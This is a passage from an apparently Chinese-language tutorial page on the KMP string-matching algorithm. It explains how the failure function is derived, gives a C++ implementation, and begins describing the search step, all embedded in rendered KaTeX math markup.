mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>需要更新成什么了。</p><h3 id="失效函数的算法"><a class="markdownIt-Anchor" href="#失效函数的算法"></a> 失效函数的算法</h3><p>  我们从上述论断中可以知道，<strong>失效函数的产生只和目标数组<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">target</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span></span></span></span>有关</strong>，因此我们可以对目标数组预处理，得到其失效函数。那么，失效函数的算法是什么呢？</p><p>  首先，我们知道对于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span></span>，是没有满足失效函数定义的下标<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>j</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">j^\prime</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span>的，那么，我们<strong>定义这种条件下，其失效函数值为-1</strong>。然后我们用<strong>递推</strong>的方式求出其他元素的失效函数。我们现在要求下标为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>的元素的失效函数，那么我们考察<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">j-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>位置上的元素，其失效函数的值为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>j</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">j_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05724em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，那么也就是说，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span></span>到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><msub><mi>j</mi><mn>0</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[j_0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05724em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>之间的字符串和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo>−</mo><msub><mi>j</mi><mn>0</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[j-1-j_0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05724em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[j-1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>之间的字符串<strong>完全相同</strong>，那么我们只要比较<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><msub><mi>j</mi><mn>0</mn></msub><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[j_0+1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05724em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>是否相同，<strong>即比较<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mi>P</mi><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[P[j-1]+1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>是否相同</strong>。如果也相同，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>+</mo><mn>1</mn><mo>=</mo><mi>P</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">P[j-1]+1=P[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>；否则，我们可以令<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">[</mo><msub><mi>j</mi><mn>0</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">P[j_0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05724em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>是新的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>j</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">j_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05724em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，继续反复上次的比较，直到找到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span></span>并且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">target[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>也不相等，那么其<strong>失效函数的值为-1</strong> 。</p><h3 id="失效函数的实现"><a class="markdownIt-Anchor" href="#失效函数的实现"></a> 失效函数的实现</h3><p>  这节给出失效函数failurefunc()的实现。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>* <span class="title">failurefunc</span><span class="params">(<span class="type">const</span> seqString&amp; target)</span><span class="type">const</span></span>&#123;</span><br><span class="line">    <span class="type">int</span>* p=<span class="keyword">new</span> <span class="type">int</span>[target.len];<span class="comment">//申请一个数组，存放失效函数</span></span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">    p[<span class="number">0</span>]=<span class="number">-1</span>;<span class="comment">//首元素的失效函数值为-1</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;target.len;++i)&#123;</span><br><span class="line">        j=i<span class="number">-1</span>;<span class="comment">//往前退一位</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(j&gt;=<span class="number">0</span>&amp;&amp;target.data[p[j]<span class="number">+1</span>]!=target.data[i]) j=p[j];<span class="comment">//如果最长相同子序列不存在，那么缩短相同子序列长度</span></span><br><span class="line">        <span class="keyword">if</span>(j&lt;<span class="number">0</span>) p[i]=<span class="number">-1</span>;<span class="comment">//直到找完都没有找到，则失效函数为-1</span></span><br><span class="line">        <span class="keyword">else</span> p[i]=p[j]<span class="number">+1</span>;<span class="comment">//找到了，更新失效函数的值</span></span><br><span class="line">    &#125;<span class="comment">//end for</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;<span class="comment">//end function</span></span><br></pre></td></tr></table></figure><h2 id="查找函数"><a class="markdownIt-Anchor" href="#查找函数"></a> 查找函数</h2><p>  有了上面的失效函数，我们可以完成KMP算法中的查找部分了。</p><h3 id="查找函数的原理"><a class="markdownIt-Anchor" href="#查找函数的原理"></a> 查找函数的原理</h3><p>  查找函数使用两个指针<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>，分别指向字符串<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">ch</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">target</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span></span></span></span>中正在比较的元素。从两字符串头开始，对<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow><annotation encoding="application/x-tex">i,j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>一同自增，直到发现<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>h</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">!</mo><mo>=</mo><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">ch[i]!=target[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>就停止；此时，利用失效函数，对<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>的值进行更新，更新为其前一个元素失效函数的值后的元素，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">P[j-1]+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，然后<strong>重新比较<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></strong>，重复上述步骤，直到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">j=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>时还是无法匹配，则固定<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>，对<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span>自增，直到匹配为止。搜索过程退出的条件是：找到了<span class="katex"><span class="katex-mathml"><math 